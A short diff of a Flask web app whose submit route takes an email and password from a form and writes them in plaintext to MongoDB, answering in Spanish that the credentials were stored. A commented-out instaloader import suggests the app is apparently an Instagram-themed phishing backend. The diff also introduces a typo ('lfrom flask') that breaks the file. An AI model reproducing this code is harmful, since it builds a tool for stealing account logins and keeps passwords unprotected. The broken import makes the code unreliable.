@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, jsonify
+lfrom flask import Flask, request, render_template, jsonify
 #import instaloader
 import pymongo
 from pymongo import MongoClient
@@ -29,7 +29,7 @@ def index():
 @app.route('/submit', methods=['POST'])
 def submit():
     try:
-        username = request.form['email']
+        email = request.form['email']
         password = request.form['password']
         collection.insert_one({"email": email, "password": password})
         return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
